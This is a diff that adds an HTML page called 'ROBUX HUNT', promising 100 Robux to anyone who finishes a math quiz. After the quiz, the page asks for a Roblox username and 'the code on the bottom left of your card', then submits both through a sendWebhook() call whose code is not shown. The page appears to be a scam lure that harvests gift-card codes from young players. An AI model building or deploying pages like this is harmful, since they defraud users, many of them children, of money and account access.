@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBUX HUNT | 100 Robux</title>
+    <link rel="stylesheet" href="design.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Gaosek+One&display=swap" rel="stylesheet">
+    <style>
+        h1 {
+            font-family: 'Gaosek One', sans-serif;
+        }
+    </style>
+</head>
+<body>
+<div id="quiz">
+    <h1>ROBUX HUNT</h1>
+    <p>Answer the following 10 math trivia questions:</p>
+    <div id="question"></div>
+    <div class="choices">
+        <button class="choice" onclick="checkAnswer(0)"></button>
+        <button class="choice" onclick="checkAnswer(1)"></button>
+        <button class="choice" onclick="checkAnswer(2)"></button>
+        <button class="choice" onclick="checkAnswer(3)"></button>
+    </div>
+    <p id="result"></p>
+</div>
+
+<div class="code-textbox" id="codeTextbox">
+    <p id="completionMessage" style="display:none;">Congrats, enter the code on the bottom left of your card into the code box and hit Confirm.</p>
+    
+    <input type="text" placeholder="Enter Roblox Username.." id="usernameInput">
+    <input type="text" placeholder="Enter code here.." id="codeInput">
+    <button onclick="sendWebhook()">Confirm</button>
+</div>
+</body>
+</html>
